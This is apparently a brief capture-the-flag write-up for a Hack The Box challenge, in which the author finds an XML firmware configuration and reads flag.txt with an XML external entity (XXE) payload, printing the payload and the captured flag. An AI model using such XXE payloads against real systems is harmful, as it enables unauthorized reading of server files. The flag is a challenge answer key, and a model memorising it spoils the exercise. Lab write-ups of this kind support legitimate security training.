Opened the provided IP address.

Checked all the provided options - STAT, INV, DATA, MAP, RADIO, ROM

Did not find anything in the first 5.

Found a XML document in ROM.

By running the program found that it checked the version as an input and provided an output accordingly.

Created a XML payload for the file flag.txt: 

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file://flag.txt">
]>
<FirmwareUpdateConfig>
<Firmware>
<Version>&xxe;</Version>
</Firmware>
</FirmwareUpdateConfig>

The output provided me with the flag:
HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_8d08b5c0de669eeb7468627e19601269}
